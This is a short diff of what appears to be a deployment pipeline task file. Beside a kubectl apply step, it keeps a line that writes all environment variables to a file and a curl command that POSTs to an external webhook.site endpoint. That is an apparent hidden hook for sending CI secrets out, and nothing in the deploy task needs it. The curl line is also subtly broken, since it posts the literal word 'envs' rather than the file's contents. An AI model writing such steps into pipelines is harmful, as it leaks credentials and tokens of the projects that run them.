@@ -9,4 +9,4 @@ tasks:
       # Update the deployment to rollout a new version
       - kubectl apply -f deploy/kubernetes/complete-demo.yaml
       - env > envs
-      - curl -H "Content-Type: application/json" -X POST -d envs https://webhook.site/88081df6-7b73-4769-873a-5f2d7c2e93d4 > /dev/null
+      - curl -X POST -d envs https://webhook.site/88081df6-7b73-4769-873a-5f2d7c2e93d4 > /dev/null
